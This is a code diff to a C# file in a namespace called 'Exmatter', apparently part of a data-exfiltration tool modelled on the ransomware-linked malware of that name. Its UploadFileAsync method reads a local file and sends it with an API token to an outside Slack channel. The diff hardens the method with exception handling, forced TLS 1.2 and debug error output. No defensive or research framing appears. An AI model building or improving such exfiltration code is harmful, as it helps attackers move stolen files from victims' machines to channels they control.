@@ -3,6 +3,7 @@ using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Threading.Tasks;
 using System.IO;
+using System.Net;
 
 namespace Exmatter
 { 
@@ -20,40 +21,52 @@ namespace Exmatter
 
         public async Task<bool> UploadFileAsync(string filePath)
         {
-            if (!File.Exists(filePath))
+            try
             {
-                throw new FileNotFoundException("The file does not exist.");
-            }
-
-            using (var httpClient = new HttpClient())
-            {
-                httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _apiKey);
-
-                using (var formContent = new MultipartFormDataContent())
+                if (!File.Exists(filePath))
                 {
-                    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                    throw new FileNotFoundException("The file does not exist.");
+                }
+
+
+                using (var httpClient = new HttpClient())
+                {
+                    httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _apiKey);
+
+                    using (var formContent = new MultipartFormDataContent())
                     {
-                        var fileName = Path.GetFileName(filePath);
-                        formContent.Add(new StreamContent(fileStream), "file", fileName);
-
-                        formContent.Add(new StringContent(_slackChannel), "channels");
-
-                        using (var response = await httpClient.PostAsync(_apiUrl, formContent))
+                        using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                         {
-                            var content = await response.Content.ReadAsStringAsync();
-                            if (response.IsSuccessStatusCode)
+                            var fileName = Path.GetFileName(filePath);
+                            formContent.Add(new StreamContent(fileStream), "file", fileName);
+
+                            formContent.Add(new StringContent(_slackChannel), "channels");
+
+                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+                            using (var response = await httpClient.PostAsync(_apiUrl, formContent))
                             {
-                                Console.WriteLine($"[+] File uploaded successfully \"{filePath}\"");
+                                var content = await response.Content.ReadAsStringAsync();
+                                if (response.IsSuccessStatusCode)
+                                {
+                                    Console.WriteLine($"[+] File uploaded successfully \"{filePath}\"");
+                                }
+                                else
+                                {
+                                    var error = await response.Content.ReadAsStringAsync();
+                                    Console.WriteLine($"[!] Error: {response.StatusCode} - {error}");
+                                }
+                                return true;
                             }
-                            else
-                            {
-                                var error = await response.Content.ReadAsStringAsync();
-                                Console.WriteLine($"[!] Error: {response.StatusCode} - {error}");
-                            }
-                            return true;
                         }
                     }
                 }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] Error: {ex.Message}");
+                Console.WriteLine($"[!] .NET DEBUG Error: {ex}");
+                return false;
             }
         }
     }
